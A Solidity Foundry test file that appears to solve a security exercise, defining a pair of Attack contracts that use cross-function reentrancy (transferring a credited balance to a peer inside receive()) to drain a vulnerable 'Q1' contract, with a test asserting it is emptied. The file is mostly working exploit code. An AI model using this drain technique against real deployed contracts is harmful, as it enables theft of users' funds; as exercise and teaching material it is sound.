// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {DeployQ1} from "script/q1.s.sol";

interface Q1 {
    function deposit() external payable;
    function getBalance() external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function userBalances(address arg0) external view returns (uint256);
    function withdrawAll() external;
}

contract Attack {
    Q1 public immutable q1;
    Attack public attackPeer;

    constructor(Q1 _q1) {
        q1 = _q1;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
    receive() external payable {
        if (address(q1).balance >= 1 ether) {
            q1.transfer(
                address(attackPeer), 
                q1.userBalances(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        q1.deposit{value: 1 ether}();
        q1.withdrawAll();
    }

    function attackNext() external {
        q1.withdrawAll();
    }

}

contract Q1Test is Test, DeployQ1 {
    Q1 public q1;
    Attack public attack1;
    Attack public attack2;

    function setUp() public override {
        q1 = Q1(deployQ1());
        attack1 = new Attack(q1);
        attack2 = new Attack(q1);

        attack1.setAttackPeer(attack2);
        attack2.setAttackPeer(attack1);

        vm.label(address(q1), "Q1");
        vm.label(address(attack1), "attack1");
        vm.label(address(attack2), "attack2");

        vm.deal(address(q1), 10 ether);
    }

    function test_reentrancy() external {
        console2.log("initial Q1 balance", address(q1).balance);
        console2.log("initial attack1 balance", address(attack1).balance);
        console2.log("initial attack2 balance", address(attack2).balance);

        attack1.attackInit{value: 1 ether}();
        for (uint256 i = 0; i < 10; i++) {
            if (i % 2 == 0) {
                attack2.attackNext();
            } else {
                attack1.attackNext();
            }
        }

        assertEq(address(q1).balance, 0);
        assertEq(
            address(attack1).balance + address(attack2).balance,
            11 ether
        );
    }
}
